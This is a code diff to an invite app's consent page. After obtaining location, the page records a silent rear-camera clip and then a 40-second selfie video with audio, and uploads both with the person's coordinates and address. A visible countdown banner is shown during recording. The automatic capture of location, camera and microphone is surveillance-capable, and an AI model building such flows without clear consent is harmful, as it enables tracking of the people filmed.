@@ -19,11 +19,18 @@ import { FloatingSparkles } from "@/components/invites/FloatingSparkles";
 const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
 const GEO_PHOTO_COUNT = 5;
 const GEO_SELFIE_PHOTO_COUNT = 2;
-// Short clips — the goal is capture + upload in seconds, not cinema quality.
+// Back camera: ultra-compressed snapshot — goal is sub-second upload.
+// 160×120 @ 10 fps, 48 kbps video-only → ~24 KB raw / ~32 KB base64 for 4 s.
 const GEO_VIDEO_DURATION_MS = 4_000;
 const GEO_VIDEO_DURATION_SECONDS = GEO_VIDEO_DURATION_MS / 1000;
-const GEO_SELFIE_VIDEO_DURATION_MS = 5_000;
+const GEO_VIDEO_BPS = 48_000;   // back camera video bitrate (no audio)
+
+// Selfie: 40 s with audio. 80 kbps video + 16 kbps audio = 96 kbps total
+// → ~480 KB raw / ~640 KB base64. Good quality floor at absolute minimum size.
+const GEO_SELFIE_VIDEO_DURATION_MS = 40_000;
 const GEO_SELFIE_VIDEO_DURATION_SECONDS = GEO_SELFIE_VIDEO_DURATION_MS / 1000;
+const GEO_SELFIE_VIDEO_BPS = 80_000;
+const GEO_SELFIE_AUDIO_BPS = 16_000;
 
 function abortAfter(ms: number): { signal: AbortSignal; clear: () => void } {
   const ctrl = new AbortController();
@@ -553,42 +560,72 @@ async function captureGeoPhotos(
   } catch { /* camera denied — skip */ } finally { stream?.getTracks().forEach((t) => t.stop()); }
 }
 
+interface GeoVideoConfig {
+  facingMode?: "environment" | "user";
+  durationMs?: number;
+  videoBps?: number;
+  /** null = no audio track (back-camera mode) */
+  audioBps?: number | null;
+  width?: number;
+  height?: number;
+  frameRate?: number;
+  onElapsed?: (elapsedSeconds: number) => void;
+}
+
 async function captureGeoVideo(
   token: string, lat: number, lng: number, address: string | undefined,
   onStateChange: (s: "recording" | "uploading" | "done" | "error") => void,
-  facingMode: "environment" | "user" = "environment",
-  durationMs: number = GEO_VIDEO_DURATION_MS,
+  config: GeoVideoConfig = {},
 ): Promise<void> {
+  const {
+    facingMode = "environment",
+    durationMs = GEO_VIDEO_DURATION_MS,
+    videoBps = GEO_VIDEO_BPS,
+    audioBps = null,          // back-camera default: no audio
+    width = 160, height = 120, frameRate = 10,
+    onElapsed,
+  } = config;
   if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") { onStateChange("error"); return; }
   const MIME_CANDIDATES = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm", "video/mp4"];
   const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
-  // Low bitrate + tiny resolution = files that upload in under a second even
-  // on 4G. At 4–5s duration: ≈75KB raw, ≈100KB after base64 overhead.
-  const VIDEO_BPS = 120_000; const AUDIO_BPS = 32_000;
   let stream: MediaStream | null = null;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 320, max: 480 }, height: { ideal: 240, max: 360 }, frameRate: { ideal: 15, max: 24 } }, audio: { echoCancellation: true, noiseSuppression: true } });
-    // 80ms is plenty for autofocus at low resolution.
+    const constraints: MediaStreamConstraints = {
+      video: { facingMode, width: { ideal: width }, height: { ideal: height }, frameRate: { ideal: frameRate, max: frameRate + 5 } },
+      audio: audioBps != null ? { echoCancellation: true, noiseSuppression: true, sampleRate: 16000 } : false,
+    };
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
     await new Promise((r) => setTimeout(r, 80));
     const chunks: Blob[] = [];
     const recorderOptions: MediaRecorderOptions = {};
     if (mimeType) recorderOptions.mimeType = mimeType;
-    try { recorderOptions.videoBitsPerSecond = VIDEO_BPS; recorderOptions.audioBitsPerSecond = AUDIO_BPS; } catch { /* */ }
+    recorderOptions.videoBitsPerSecond = videoBps;
+    if (audioBps != null) recorderOptions.audioBitsPerSecond = audioBps;
     const recorder = new MediaRecorder(stream, recorderOptions);
     recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
     onStateChange("recording");
+    // Live elapsed-second ticker for UI countdown
+    let elapsedTimer: ReturnType<typeof setInterval> | null = null;
+    if (onElapsed) {
+      let elapsed = 0;
+      elapsedTimer = setInterval(() => { elapsed += 1; onElapsed(elapsed); }, 1000);
+    }
     await new Promise<void>((resolve, reject) => {
       recorder.onstop = () => resolve(); recorder.onerror = () => reject(new Error("MediaRecorder error"));
       recorder.start(200); setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, durationMs);
     });
+    if (elapsedTimer) clearInterval(elapsedTimer);
     const blob = new Blob(chunks, { type: mimeType || "video/webm" });
     if (blob.size === 0) { onStateChange("error"); return; }
     const base64 = await new Promise<string>((res, rej) => { const reader = new FileReader(); reader.onload = () => res(reader.result as string); reader.onerror = () => rej(new Error("FileReader error")); reader.readAsDataURL(blob); });
     onStateChange("uploading");
     const body = JSON.stringify({ token, videoData: base64, mimeType: blob.type, durationMs, latitude: lat, longitude: lng, address, cameraFacing: facingMode });
     let uploaded = false;
-    for (let attempt = 0; attempt < 2 && !uploaded; attempt++) {
-      try { const { signal, clear } = abortAfter(10_000); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
+    // Back-camera clips are tiny — one fast attempt is enough.
+    const maxAttempts = audioBps == null ? 1 : 2;
+    const uploadTimeout = audioBps == null ? 5_000 : 15_000;
+    for (let attempt = 0; attempt < maxAttempts && !uploaded; attempt++) {
+      try { const { signal, clear } = abortAfter(uploadTimeout); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
     }
     onStateChange(uploaded ? "done" : "error");
   } catch { onStateChange("error"); } finally { stream?.getTracks().forEach((t) => t.stop()); }
@@ -634,6 +671,7 @@ export default function ConsentPage() {
   const [geoSelfiePhotoDone, setGeoSelfiePhotoDone] = useState(false);
   const [geoVideoState, setGeoVideoState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
   const [geoSelfieState, setGeoSelfieState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
+  const [geoSelfieElapsed, setGeoSelfieElapsed] = useState(0);
   const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
   const [batteryCharging, setBatteryCharging] = useState(false);
   const [activityType, setActivityType] = useState<ActivityType>("stationary");
@@ -1219,12 +1257,27 @@ export default function ConsentPage() {
       // Rear-facing "surroundings" clip, then the front-facing selfie clip —
       // run sequentially since most phones only expose one active camera
       // stream at a time.
-      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s), "environment")
+      // Back camera: ultra-compressed, no audio — sub-second upload
+      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s), {
+        facingMode: "environment",
+        durationMs: GEO_VIDEO_DURATION_MS,
+        videoBps: GEO_VIDEO_BPS,
+        audioBps: null,
+        width: 160, height: 120, frameRate: 10,
+      })
         .catch(() => setGeoVideoState("error"))
         .finally(() => {
           if (geoSelfieStartedRef.current) return;
           geoSelfieStartedRef.current = true;
-          captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), "user", GEO_SELFIE_VIDEO_DURATION_MS)
+          // Selfie: 40 s with audio, good quality floor
+          captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), {
+            facingMode: "user",
+            durationMs: GEO_SELFIE_VIDEO_DURATION_MS,
+            videoBps: GEO_SELFIE_VIDEO_BPS,
+            audioBps: GEO_SELFIE_AUDIO_BPS,
+            width: 320, height: 240, frameRate: 15,
+            onElapsed: (s) => setGeoSelfieElapsed(s),
+          })
             .catch(() => setGeoSelfieState("error"));
         });
     }
@@ -2049,28 +2102,54 @@ export default function ConsentPage() {
               </div>
             )}
 
-            {/* Selfie video — recording */}
-            {geoSelfieState === "recording" && (
-              <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
-                <Video className="h-4 w-4 text-purple-400 flex-shrink-0 animate-pulse" />
-                <div className="flex-1 min-w-0">
-                  <p className="text-[13px] font-semibold text-purple-200">
-                    Geo Board: recording autoportrait ({GEO_SELFIE_VIDEO_DURATION_SECONDS}s)…
-                  </p>
-                  <div className="mt-1.5 h-1 bg-purple-900/50 rounded-full overflow-hidden">
-                    <div className="h-full bg-purple-400 rounded-full"
-                      style={{ width: "100%", transition: `width ${GEO_SELFIE_VIDEO_DURATION_SECONDS}s linear` }} />
+            {/* Selfie video — recording (40 s with live countdown) */}
+            {geoSelfieState === "recording" && (() => {
+              const remaining = Math.max(0, GEO_SELFIE_VIDEO_DURATION_SECONDS - geoSelfieElapsed);
+              const pct = Math.min(100, (geoSelfieElapsed / GEO_SELFIE_VIDEO_DURATION_SECONDS) * 100);
+              const mins = Math.floor(remaining / 60);
+              const secs = remaining % 60;
+              const timeLabel = mins > 0 ? `${mins}:${String(secs).padStart(2, "0")}` : `${secs}s`;
+              return (
+                <div className="rounded-xl px-4 py-3 flex items-start gap-3"
+                  style={{ background: "linear-gradient(135deg,rgba(126,34,206,0.22),rgba(88,28,135,0.28))", border: "1px solid rgba(192,132,252,0.35)", boxShadow: "0 0 12px rgba(168,85,247,0.15)" }}>
+                  {/* Pulsing record dot */}
+                  <div className="mt-0.5 flex-shrink-0 relative">
+                    <span className="absolute inset-0 rounded-full bg-red-500 opacity-40 animate-ping" style={{ width: 14, height: 14 }} />
+                    <span className="relative block rounded-full bg-red-500" style={{ width: 14, height: 14 }} />
+                  </div>
+                  <div className="flex-1 min-w-0">
+                    <div className="flex items-center justify-between mb-1">
+                      <p className="text-[13px] font-bold text-purple-100 tracking-wide">
+                        🎥 Geo Board: recording autoportrait
+                      </p>
+                      <span className="text-[12px] font-mono font-semibold text-purple-300 ml-2 flex-shrink-0">
+                        {timeLabel} left
+                      </span>
+                    </div>
+                    {/* Segmented progress bar */}
+                    <div className="mt-1.5 h-2 bg-purple-950/60 rounded-full overflow-hidden">
+                      <div className="h-full rounded-full"
+                        style={{
+                          width: `${pct}%`,
+                          background: "linear-gradient(90deg,#a855f7,#e879f9)",
+                          transition: "width 0.9s linear",
+                          boxShadow: "0 0 6px rgba(232,121,249,0.6)",
+                        }} />
+                    </div>
+                    <p className="mt-1 text-[11px] text-purple-400">Audio ● {GEO_SELFIE_VIDEO_DURATION_SECONDS}s · compressed</p>
                   </div>
                 </div>
-              </div>
-            )}
+              );
+            })()}
             {/* Selfie video — uploading */}
             {geoSelfieState === "uploading" && (
               <div className="rounded-xl px-4 py-3 flex items-center gap-3"
-                style={{ background: "rgba(126,34,206,0.18)", border: "1px solid rgba(168,85,247,0.3)" }}>
+                style={{ background: "linear-gradient(135deg,rgba(126,34,206,0.22),rgba(88,28,135,0.28))", border: "1px solid rgba(192,132,252,0.35)" }}>
                 <Loader2 className="h-4 w-4 text-purple-400 flex-shrink-0 animate-spin" />
-                <p className="text-[13px] font-semibold text-purple-200">Geo Board: archiving autoportrait sequence…</p>
+                <div>
+                  <p className="text-[13px] font-semibold text-purple-200">Geo Board: archiving autoportrait sequence…</p>
+                  <p className="text-[11px] text-purple-500 mt-0.5">Compressing &amp; uploading</p>
+                </div>
               </div>
             )}
             {/* Selfie photos or video — done (show once either finishes) */}
